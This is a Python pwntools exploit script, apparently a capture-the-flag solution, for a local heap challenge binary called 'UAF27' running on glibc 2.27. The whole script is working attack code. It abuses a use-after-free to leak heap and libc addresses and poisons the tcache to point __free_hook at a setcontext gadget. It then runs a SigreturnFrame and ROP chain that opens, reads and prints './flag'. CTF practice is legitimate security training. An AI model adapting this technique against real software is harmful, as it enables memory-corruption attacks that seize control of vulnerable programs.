
#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
#context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./UAF27')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('./libc-2.27.so')
elf = ELF('./UAF27')

def pr(a,addr):
	log.success(a+': '+hex(addr))

def add(length):
	p.sendlineafter(':','1')
	p.sendlineafter('len:',str(length))

def delete(idx):
	p.sendlineafter(':','2')
	p.sendlineafter('idx:',str(idx))

def edit(idx,ct):
	p.sendlineafter(':','3')
	p.sendlineafter('idx:',str(idx))
	p.send(ct)

def show(idx):
	p.sendlineafter(':','4')
	p.sendlineafter('idx:',str(idx))

#==========================heapbase============================

add(0x10) #0
add(0x10) #1
delete(1)
delete(0)
show(0)
heapbase = u64(p.recv(6).ljust(8, "\x00")) - 0x280
pr('heapbase',heapbase)
add(0x10) #2
add(0x10) #3

#=========================libcbase=============================

add(0x500) #4
add(0x10)  #5
delete(4)

show(4)
leak = u64(p.recv(6).ljust(8, "\x00"))
libcbase = leak - 0x3ebca0 #0x3ebca0
setcontext_door = libcbase + libc.sym['setcontext'] + 53
free_hook = libcbase + libc.sym['__free_hook']
pr('libcbase',libcbase)

#==============================================================

delete(5) 
edit(5, p64(free_hook))
add(0x10) #6
add(0x10) #7
edit(7, p64(setcontext_door)) # free_hook into setcontext_door

#=========================setcontext===========================

prdi_ret = libcbase + libc.search(asm("pop rdi\nret")).next()
prsi_ret = libcbase + libc.search(asm("pop rsi\nret")).next()
prdx_ret = libcbase + libc.search(asm("pop rdx\nret")).next()
ret = libcbase + libc.search(asm("ret")).next()

def ropchain(function,arg1,arg2,arg3):
	ret  = p64(prdi_ret) + p64(arg1)
	ret += p64(prsi_ret) + p64(arg2)
	ret += p64(prdx_ret) + p64(arg3)
	ret += p64(function)
	return ret

open_addr = libcbase + libc.sym['open']
read_addr = libcbase + libc.sym['read']
write_addr = libcbase + libc.sym['write']

context_addr = heapbase + 0x2a0 #0x250 + 0x20 + 0x20 + 0x10
flag_string_addr = context_addr + 0x200 #0x4a0

frame = SigreturnFrame()
frame.rsp = context_addr + 0xf8
frame.rip = ret

payload = str(frame)
payload += ropchain(open_addr,flag_string_addr,0,0)
payload += ropchain(read_addr,3,flag_string_addr,0x30)
payload += ropchain(write_addr,1,flag_string_addr,0x30)
payload = payload.ljust(0x200,'\x00') 
payload += './flag\x00'

#============================================================

add(0x300) #8
edit(8,payload)

delete(8)
p.interactive()

